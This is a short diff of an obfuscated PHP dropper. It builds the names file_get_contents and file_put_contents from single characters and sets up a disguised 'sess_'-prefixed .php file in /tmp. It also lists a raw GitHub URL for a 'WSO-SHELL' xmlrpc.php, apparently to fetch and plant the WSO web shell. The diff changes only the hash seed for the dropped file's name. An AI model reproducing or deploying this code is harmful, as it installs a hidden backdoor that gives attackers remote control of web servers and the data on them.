@@ -3,7 +3,7 @@ error_reporting(E_ALL);
 ini_set('display_errors', 1);
 $o0 = "f" . "i" . "l" . "e" . "_" . "g" . "e" . "t" . "_" . "c" . "o" . "n" . "t" . "e" . "n" . "t" . "s";
 $o1 = "f" . "i" . "l" . "e" . "_" . "p" . "u" . "t" . "_" . "c" . "o" . "n" . "t" . "e" . "n" . "t" . "s";
-$d4 = 'sess_' . md5('5aebf9df23ff891abf76972ed0c2c46c') . '.php';
+$d4 = 'sess_' . md5('a8d040647052341e1a3efef7883cffd3') . '.php';
 $u5 = ['https://raw.githubusercontent.com/rendihidayat683/WSO-SHELL/refs/heads/main/xmlrpc.php', "/tmp/$d4"];
 
 function n4(){
